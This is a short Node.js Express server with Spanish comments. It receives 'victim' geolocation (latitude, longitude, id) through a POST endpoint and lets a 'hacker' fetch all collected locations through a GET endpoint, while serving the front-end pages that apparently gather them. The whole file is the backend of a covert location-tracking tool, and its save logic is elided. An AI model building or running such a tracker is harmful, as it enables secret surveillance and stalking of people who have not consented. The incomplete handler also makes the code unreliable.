const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());

// --- Agrega estas líneas para servir archivos estáticos ---
// Sirve la carpeta "frontend" donde están tus archivos HTML
app.use(express.static(path.join(__dirname, '..')));
// --------------------------------------------------------

const dataFilePath = path.join(__dirname, 'ubicaciones.json');

// Endpoint para recibir las ubicaciones de la víctima
app.post('/api/ubicacion', (req, res) => {
    const { lat, lon, id } = req.body;
    const timestamp = new Date().toISOString();
    const nuevaUbicacion = { id, lat, lon, timestamp };

    // ¡Aquí está la magia! Imprime los datos en la consola
    console.log(`Nueva ubicación recibida:`, nuevaUbicacion);

    fs.readFile(dataFilePath, 'utf8', (err, data) => {
        // ... (el resto del código sigue igual)
        // ...
    });
});

// Endpoint para que el "hacker" obtenga todas las ubicaciones
app.get('/api/ubicaciones', (req, res) => {
    fs.readFile(dataFilePath, 'utf8', (err, data) => {
        if (err) {
            return res.status(200).send([]);
        }
        try {
            res.status(200).send(JSON.parse(data));
        } catch (e) {
            res.status(500).send({ message: 'Error al leer las ubicaciones.' });
        }
    });
});

app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});